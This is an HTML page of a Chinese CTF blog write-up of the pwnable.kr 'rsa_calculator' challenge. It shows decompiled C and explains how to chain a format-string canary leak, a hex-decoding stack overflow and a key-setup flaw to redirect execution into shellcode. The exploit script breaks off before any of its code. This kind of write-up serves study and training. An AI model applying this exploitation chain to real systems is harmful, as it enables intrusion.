@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言读代码题，虽然是逆向代码，哈哈。这道题得细心找，不能急，否则就得像我一样花了很长时间在printf的漏洞利用上了，悲催。 分析分析反编译代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849signed __int64 set_key()&amp;#123;  int v1;">
+<meta name="keywords" content="pwnable.kr,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-rsa_calculator">
+<meta property="og:url" content="http://yoursite.com/2018/03/14/pwnable.kr-rsa_calculator/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言读代码题，虽然是逆向代码，哈哈。这道题得细心找，不能急，否则就得像我一样花了很长时间在printf的漏洞利用上了，悲催。 分析分析反编译代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849signed __int64 set_key()&amp;#123;  int v1;">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:10:57.851Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr-rsa_calculator">
+<meta name="twitter:description" content="前言读代码题，虽然是逆向代码，哈哈。这道题得细心找，不能急，否则就得像我一样花了很长时间在printf的漏洞利用上了，悲催。 分析分析反编译代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849signed __int64 set_key()&amp;#123;  int v1;">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/14/pwnable.kr-rsa_calculator/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnable.kr-rsa_calculator | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/14/pwnable.kr-rsa_calculator/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.kr-rsa_calculator
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-03-14 12:59:32" itemprop="dateCreated datePublished" datetime="2018-03-14T12:59:32+08:00">2018-03-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:10:57" itemprop="dateModified" datetime="2018-08-04T15:10:57+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>读代码题，虽然是逆向代码，哈哈。这道题得细心找，不能急，否则就得像我一样花了很长时间在<code>printf</code>的漏洞利用上了，悲催。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">set_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+18h] [bp-18h]@7</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+1Ch] [bp-14h]@7</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+20h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+24h] [bp-Ch]@7</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+28h] [bp-8h]@7</span></span><br><span class="line">  __int16 v6; <span class="comment">// [sp+2Ch] [bp-4h]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// [sp+2Eh] [bp-2h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-SET RSA KEY-"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"p : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"q : "</span>, &amp;v6);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"p, q, set to %d, %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-current private key and public keys-"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"public key : "</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x "</span>, pub[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\npublic key : "</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x "</span>, pri[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v4 = v6 * v7;</span><br><span class="line">  v5 = (v6 - <span class="number">1</span>) * (v7 - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"N set to %d, PHI set to %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"set public key exponent e : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"set private key exponent d : "</span>, &amp;v1);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 &amp;&amp; v2 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 &amp;&amp; v2 * v1 % (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong parameters for key generation"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"key length too short"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  set_pub_key(v1, v4, (__int64)pub);</span><br><span class="line">  set_pri_key(v2, v4, (__int64)pri);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"key set ok"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"pubkey(e,n) : (%d(%08x), %d(%08x))\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"prikey(d,n) : (%d(%08x), %d(%08x))\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  is_set = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">RSA_decrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// dl@10</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdx@12</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rsi@14</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax@15</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx@18</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-634h]@3</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+10h] [bp-630h]@5</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+14h] [bp-62Ch]@11</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+18h] [bp-628h]@11</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+1Ch] [bp-624h]@6</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [sp+20h] [bp-620h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [sp+21h] [bp-61Fh]@12</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [sp+22h] [bp-61Eh]@12</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [sp+2Fh] [bp-611h]@6</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">1024</span>]; <span class="comment">// [sp+30h] [bp-610h]@9</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">520</span>]; <span class="comment">// [sp+430h] [bp-210h]@11</span></span><br><span class="line">  __int64 v17; <span class="comment">// [sp+638h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v17 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( is_set )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"how long is your data?(max=1024) : "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">1024</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"paste your hex encoded data"</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = v6-- != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v1 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v10 = fread(&amp;ptr, <span class="number">1u</span>LL, <span class="number">1u</span>LL, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( ptr == <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15[v7++] = ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">2</span> * v7 &gt; i )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = v15[i];</span><br><span class="line">        v12 = v15[i + <span class="number">1</span>];</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        v2 = &amp;src[v9++];</span><br><span class="line">        __isoc99_sscanf(&amp;v11, <span class="string">"%02x"</span>, v2);</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v3 = src;</span><br><span class="line">      <span class="built_in">memcpy</span>(g_ebuf, src, v7);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v7 / <span class="number">8</span> &gt; i; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = pri;</span><br><span class="line">        v4 = decrypt(g_ebuf[i], (__int64)pri);</span><br><span class="line">        *(&amp;g_pbuf + i) = v4;</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;g_pbuf + i) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"- decrypted result -"</span>);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;g_pbuf, v3);                      <span class="comment">// /格式化字符串漏洞</span></span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"data length exceeds buffer size"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"set RSA key first"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v17;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// dl@4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"- Buggy RSA Calculator -\n"</span>);</span><br><span class="line">  func[<span class="number">0</span>] = (__int64)set_key;</span><br><span class="line">  qword_602508 = (__int64)RSA_encrypt;</span><br><span class="line">  qword_602510 = (__int64)RSA_decrypt;</span><br><span class="line">  qword_602518 = (__int64)help;</span><br><span class="line">  qword_602520 = (__int64)myexit;</span><br><span class="line">  dword_602528 = <span class="number">1634629488</span>;</span><br><span class="line">  dword_60252C = <span class="number">778398818</span>;</span><br><span class="line">  dword_602530 = <span class="number">1936290411</span>;</span><br><span class="line">  dword_602534 = <span class="number">1953719650</span>;</span><br><span class="line">  qword_602538 = (__int64)system;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n- select menu -"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 1. : set key pair"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 2. : encrypt"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 3. : decrypt"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 4. : help"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 5. : exit"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">    v3 = &amp;v6;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt; <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> *))func[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 - <span class="number">1</span>)])(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    v5 = g_try++ &gt; <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"this is demo version"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"invalid menu"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码对于我来说还是有点长的，哈哈。贴了几个关键的函数，大致分析一下程序很容易找到在<code>RSA_decrypt</code>函数中存在<code>printf</code>格式化字符串漏洞，利用该漏洞可以读写内存。但是仔细分析后发现，仅仅利用该漏洞无法更改返回地址或则是got表。那就需要寻找另外的漏洞了。<br>接下来就是仔细分析程序各个部分的功能找出漏洞，经过简单分析可以发现另外两处漏洞。</p>
+<ul>
+<li><code>set_key</code>函数在设置<code>key</code>时没有严格按照RSA算法的要求（具体算法百度），导致可以很容易设置想要的值。</li>
+<li><code>RSA_decrypt</code>函数中，在向<code>src</code>变量赋值时存在栈溢出。</li>
+</ul>
+<p>主要看看这个栈溢出。输入的密文<code>v15</code>是一个16进制编码的字符串，这里就是将<code>v15</code>转化为字符串存到<code>src</code>中。如果<code>v15</code>的长度为最大1024字节，那么这里的循环次数就是<code>2×v7/2=1024</code>，而每次循环<code>src</code>都要赋一个字节的值，所以循环<code>520</code>次后就开始覆盖栈的其他空间了。继续分析，其实当循环<code>512</code>次后<code>v15</code>的索引就已经越界了，其后就是<code>src</code>变量。那么后续覆盖返回地址和写shellcode就是使用<code>src</code>中的16进制编码的字符串了。当然<code>RSA_decrypt</code>函数是有<code>stack canary</code>的，需要先利用格式化字符串漏洞leak出来。<br>整理利用思路，这里我先leak处<code>canary</code>，然后利用栈溢出覆盖返回地址为<code>pri</code>变量的地址之后跟shellcode，并利用<code>set_key</code>函数的缺陷设置<code>pri</code>的值为<code>jmp rsp</code>指令。这样当函数返回时会跳转到<code>pri</code>执行<code>jmp rsp</code>从而执行shell。下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 